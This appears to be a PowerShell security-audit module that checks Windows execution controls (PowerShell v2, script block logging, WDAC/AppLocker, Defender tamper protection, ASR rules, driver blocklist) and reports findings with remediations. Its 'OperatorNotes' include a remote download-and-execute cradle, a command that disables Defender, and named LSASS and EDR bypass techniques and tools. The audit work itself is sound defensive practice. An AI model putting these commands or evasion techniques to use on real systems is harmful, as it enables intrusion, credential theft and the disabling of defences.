#requires -Version 5.1


$ps2Feature = $null
try {
    # Client OS uses Get-WindowsOptionalFeature, Server uses Get-WindowsFeature
    $ps2Feature = Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 -ErrorAction SilentlyContinue
    if (-not $ps2Feature) {
        $ps2Feature = Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root -ErrorAction SilentlyContinue
    }
} catch {}

# Fallback: does the engine load?
$ps2EngineAvailable = $false
try {
    $null = & powershell.exe -Version 2 -Command "1" 2>&1
    $ps2EngineAvailable = ($LASTEXITCODE -eq 0)
} catch {
    $ps2EngineAvailable = $false
}

$BR2.Raw.PowerShellV2 = @{
    FeatureState     = if ($ps2Feature) { $ps2Feature.State } else { 'Unknown' }
    EngineAvailable  = $ps2EngineAvailable
}

if ($ps2EngineAvailable) {
    $BR2.Findings.Add( (New-Finding `
        -CheckID 'BR-EXE-001' `
        -Category 'ExecutionControl' `
        -Title 'PowerShell v2 engine is available (AMSI and ScriptBlock logging bypass)' `
        -Severity 'High' `
        -Exploitability 'High' `
        -AttackPath 'Downgrade to PowerShell v2 to evade AMSI, Script Block Logging, and Constrained Language Mode' `
        -MITRE @('T1562.001','T1562.002') `
        -Evidence @{
            FeatureState    = if ($ps2Feature) { $ps2Feature.State } else { 'Unknown via DISM' }
            EngineAvailable = $true
        } `
        -Remediation 'Remove the Windows PowerShell 2.0 feature: Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root. Deprecated in Windows 10 1809 and should not be present on modern builds.' `
        -OperatorNotes ('powershell.exe -Version 2 -Command "..." runs in the v2 engine which predates AMSI (Windows 10 only added AMSI to v3+). No Script Block Logging, no CLM. Excellent fallback when v5 is locked down. Test with: powershell -Version 2 -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString(''http://...'')". Note: .NET 2.0/3.5 must be available for v2 to actually launch - check HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP.') `
        -References @(
            'https://devblogs.microsoft.com/powershell/detecting-offensive-powershell-attack-tools/',
            'https://www.leeholmes.com/detecting-and-preventing-powershell-downgrade-attacks/'
        )
    ))
}

$sblPath = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'
$sblEnabled = Get-RegistryValueSafe -Path $sblPath -Name 'EnableScriptBlockLogging'
$sblInvocation = Get-RegistryValueSafe -Path $sblPath -Name 'EnableScriptBlockInvocationLogging'

$BR2.Raw.ScriptBlockLogging = @{
    EnableScriptBlockLogging           = $sblEnabled
    EnableScriptBlockInvocationLogging = $sblInvocation
}

if ($sblEnabled -ne 1) {
    $BR2.Findings.Add( (New-Finding `
        -CheckID 'BR-EXE-005' `
        -Category 'ExecutionControl' `
        -Title 'PowerShell Script Block Logging is disabled' `
        -Severity 'Medium' `
        -Exploitability 'Medium' `
        -AttackPath 'PowerShell activity executed without EventID 4104 evidence' `
        -MITRE 'T1562.002' `
        -Evidence @{
            EnableScriptBlockLogging = $sblEnabled
            Path                     = $sblPath
        } `
        -Remediation 'Enable Script Block Logging via Computer Configuration\Administrative Templates\Windows Components\Windows PowerShell. Combine with Transcription for full visibility.' `
        -OperatorNotes 'Absence of SBL is a defensive gap indicator. Even with SBL on, operators can use (1) obfuscation that produces huge 4104 events the SOC does not parse; (2) InvisiShell or ETW patching to suppress logging at runtime; (3) use of .NET loaders that never enter the PS pipeline (Execute-Assembly via beacon). Mark this as a Medium because modern EDR often has its own telemetry independent of Microsoft-Windows-PowerShell/Operational.' `
        -References @(
            'https://devblogs.microsoft.com/powershell/powershell-the-blue-team/',
            'https://github.com/cobbr/InvisiShell'
        )
    ))
}

# WDAC - look for active policies in CiPolicies
$wdacPolicyDir = "$env:windir\System32\CodeIntegrity\CiPolicies\Active"
$wdacPolicies = @()
if (Test-Path $wdacPolicyDir) {
    $wdacPolicies = @(Get-ChildItem $wdacPolicyDir -Filter *.cip -ErrorAction SilentlyContinue)
}

# AppLocker - check if any policies are effective
$appLockerEnabled = $false
try {
    $alPolicy = Get-AppLockerPolicy -Effective -ErrorAction SilentlyContinue
    # An effective policy has rules if it's meaningfully configured
    $appLockerEnabled = ($alPolicy -and $alPolicy.RuleCollections.Count -gt 0 -and
                         ($alPolicy.RuleCollections | Where-Object { $_.Count -gt 0 }).Count -gt 0)
} catch {}

$BR2.Raw.ExecutionControl = @{
    WDACPolicies     = @($wdacPolicies | Select-Object -ExpandProperty Name)
    AppLockerActive  = $appLockerEnabled
}

if (-not $wdacPolicies.Count -and -not $appLockerEnabled) {
    $BR2.Findings.Add( (New-Finding `
        -CheckID 'BR-EXE-002' `
        -Category 'ExecutionControl' `
        -Title 'Neither WDAC nor AppLocker is enforcing on this host' `
        -Severity 'High' `
        -Exploitability 'High' `
        -AttackPath 'Unrestricted execution of attacker-supplied binaries and scripts' `
        -MITRE 'T1562.001' `
        -Evidence @{
            WDACPolicies    = @($wdacPolicies | Select-Object -ExpandProperty Name)
            AppLockerActive = $appLockerEnabled
        } `
        -Remediation 'Deploy WDAC in enforce mode from a signed base policy. AppLocker is a lower-effort alternative but has more known bypasses.' `
        -OperatorNotes 'No appcontrol means any binary or script in a writable path can execute. With WDAC in audit only, events 3076/3077 fire but execution still occurs - check Microsoft-Windows-CodeIntegrity/Operational for audit vs enforce. Bypasses for both are publicly catalogued (Oddvar Moe LOLBAS, api0cradle UltimateAppLockerBypassList) but the bar for enforce mode is meaningful.' `
        -References @(
            'https://github.com/api0cradle/UltimateAppLockerByPassList',
            'https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/'
        )
    ))
}

$mpState = $null
try { $mpState = Get-MpComputerStatus -ErrorAction SilentlyContinue } catch {}
$mpPref = $null
try { $mpPref = Get-MpPreference -ErrorAction SilentlyContinue } catch {}

$tamperOn = $false
if ($mpState) { $tamperOn = [bool]$mpState.IsTamperProtected }

$BR2.Raw.Defender = @{
    RealTimeProtectionEnabled = if ($mpState) { $mpState.RealTimeProtectionEnabled } else { $null }
    IsTamperProtected         = $tamperOn
    AMServiceEnabled          = if ($mpState) { $mpState.AMServiceEnabled } else { $null }
    AMEngineVersion           = if ($mpState) { $mpState.AMEngineVersion } else { $null }
    AntivirusSignatureVersion = if ($mpState) { $mpState.AntivirusSignatureVersion } else { $null }
    ASRRules                  = if ($mpPref)  { $mpPref.AttackSurfaceReductionRules_Ids } else { $null }
    ASRActions                = if ($mpPref)  { $mpPref.AttackSurfaceReductionRules_Actions } else { $null }
}

if ($mpState -and -not $tamperOn) {
    $BR2.Findings.Add( (New-Finding `
        -CheckID 'BR-EXE-004' `
        -Category 'ExecutionControl' `
        -Title 'Defender Tamper Protection is not enabled' `
        -Severity 'High' `
        -Exploitability 'High' `
        -AttackPath 'Disable or weaken Defender from an elevated context' `
        -MITRE 'T1562.001' `
        -Evidence @{ IsTamperProtected = $false } `
        -Remediation 'Enable Tamper Protection via the Windows Security UI, Intune, or Configuration Manager. Default on for new installs since Windows 10 2004 but frequently found disabled in imaged environments.' `
        -OperatorNotes 'Without Tamper Protection, as local admin: Set-MpPreference -DisableRealtimeMonitoring $true, or modify HKLM\SOFTWARE\Policies\Microsoft\Windows Defender directly. With Tamper Protection on, those calls silently no-op. Bypasses exist (dcom MpCmdRun abuse, certain signed driver BYOVD techniques) but this is the difference between "trivial" and "meaningful effort".' `
        -References @(
            'https://learn.microsoft.com/en-us/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection',
            'https://github.com/rad9800/bootlicker'
        )
    ))
}

# ASR rule coverage
$asrRulesMap = @{
    'BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550' = 'Block executable content from email client and webmail'
    'D4F940AB-401B-4EFC-AADC-AD5F3C50688A' = 'Block all Office applications from creating child processes'
    '3B576869-A4EC-4529-8536-B80A7769E899' = 'Block Office applications from creating executable content'
    '75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84' = 'Block Office applications from injecting code into other processes'
    'D3E037E1-3EB8-44C8-A917-57927947596D' = 'Block JavaScript or VBScript from launching downloaded executable content'
    '5BEB7EFE-FD9A-4556-801D-275E5FFC04CC' = 'Block execution of potentially obfuscated scripts'
    '92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B' = 'Block Win32 API calls from Office macros'
    '01443614-CD74-433A-B99E-2ECDC07BFC25' = 'Block executable files unless they meet a prevalence, age, or trusted list criterion'
    'C1DB55AB-C21A-4637-BB3F-A12568109D35' = 'Use advanced protection against ransomware'
    '9E6C4E1F-7D60-472F-BA1A-A39EF669E4B2' = 'Block credential stealing from LSASS'
    'D1E49AAC-8F56-4280-B9BA-993A6D77406C' = 'Block process creations from PSExec and WMI commands'
    'B2B3F03D-6A65-4F7B-A9C7-1C7EF74A9BA4' = 'Block untrusted and unsigned processes that run from USB'
    '26190899-1602-49E8-8B27-EB1D0A1CE869' = 'Block Office communication application from creating child processes'
    '7674BA52-37EB-4A4F-A9A1-F0F9A1619A2C' = 'Block Adobe Reader from creating child processes'
    'E6DB77E5-3DF2-4CF1-B95A-636979351E5B' = 'Block persistence through WMI event subscription'
    '56A863A9-875E-4185-98A7-B882C64B5CE5' = 'Block abuse of exploited vulnerable signed drivers'
    '33DDEDF1-C6E0-47CB-833E-DE6133960387' = 'Block rebooting machine in Safe Mode'
    'C0033C00-D16D-4114-A5A0-DC9B3A7D2CEB' = 'Block use of copied or impersonated system tools'
    'A8F5898E-1DC8-49A9-9878-85004B8A61E6' = 'Block Webshell creation for Servers'
}

if ($mpPref -and $mpPref.AttackSurfaceReductionRules_Ids) {
    $configuredRules = $mpPref.AttackSurfaceReductionRules_Ids
    $actions         = $mpPref.AttackSurfaceReductionRules_Actions
    $enforcedCount = 0
    for ($i = 0; $i -lt $configuredRules.Count; $i++) {
        if ($actions[$i] -eq 1) { $enforcedCount++ }  # 1 = block, 2 = audit, 6 = warn
    }
    $totalRules = $asrRulesMap.Count
    if ($enforcedCount -lt ($totalRules / 2)) {
        $BR2.Findings.Add( (New-Finding `
            -CheckID 'BR-EXE-003' `
            -Category 'ExecutionControl' `
            -Title "Defender ASR has only $enforcedCount of $totalRules rules in enforce mode" `
            -Severity 'Medium' `
            -Exploitability 'Medium' `
            -AttackPath 'Macro execution, LSASS dumping, and lateral movement tooling not blocked' `
            -MITRE 'T1562.001' `
            -Evidence @{
                EnforcedCount  = $enforcedCount
                TotalRules     = $totalRules
                ConfiguredRules = $configuredRules
                Actions        = $actions
            } `
            -Remediation 'Deploy the Microsoft ASR baseline - enforce at least the LSASS, child-process, and obfuscated-script rules. Audit mode first for compatibility, then enforce.' `
            -OperatorNotes 'ASR rules are not signature-based; they are behavioural. The LSASS rule (9E6C4E1F) blocks the common LSASS handle-open pattern used by mimikatz, nanodump, and procdump. Bypass options: handle duplication from an existing privileged process, silent process exit technique (spawn and instrument your own LSASS-child), or simply stage offline and exfil. The rule also produces 1121 events.' `
            -References @(
                'https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference',
                'https://emptynebuli.github.io/posts/ASR-Rules-Research/'
            )
        ))
    }
}

# Microsoft ships a recommended driver blocklist. It is ON by default on Windows 11 22H2+ for HVCI-enabled devices, but worth verifying.
$vdrvPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\CI\Config'
$vdrvEnabled = Get-RegistryValueSafe -Path $vdrvPath -Name 'VulnerableDriverBlocklistEnable'

$BR2.Raw.VulnerableDriverBlocklist = $vdrvEnabled

if ($vdrvEnabled -ne 1) {
    $BR2.Findings.Add( (New-Finding `
        -CheckID 'BR-EXE-007' `
        -Category 'ExecutionControl' `
        -Title 'Microsoft Vulnerable Driver Blocklist not enforced' `
        -Severity 'High' `
        -Exploitability 'High' `
        -AttackPath 'BYOVD (Bring Your Own Vulnerable Driver) for kernel-mode code execution or LSASS protection bypass' `
        -MITRE 'T1068' `
        -Evidence @{
            VulnerableDriverBlocklistEnable = $vdrvEnabled
            Path                            = $vdrvPath
        } `
        -Remediation 'Enable the Microsoft Vulnerable Driver Blocklist via Windows Security UI (Core Isolation > Microsoft Vulnerable Driver Blocklist). Intune setting: Enable "Microsoft Vulnerable Driver Blocklist".' `
        -OperatorNotes 'BYOVD is great for the latest techniques of kernel evasion: drop a signed-but-vulnerable driver, load it, use it to tear down EDR callbacks / unprotect LSASS / blind ETW. RTCore64 (MSI Afterburner), PROCEXP152 (older Process Explorer), and zemana.sys remain effective against hosts without the blocklist. Tools: kdmapper, KDU, EDRSandblast. Driver blocklist on raises the bar significantly because Microsoft ingests new abused drivers into the list via MSRC reports.' `
        -References @(
            'https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/microsoft-recommended-driver-block-rules',
            'https://github.com/wavestone-cdt/EDRSandblast',
            'https://www.loldrivers.io/'
        )
    ))
}
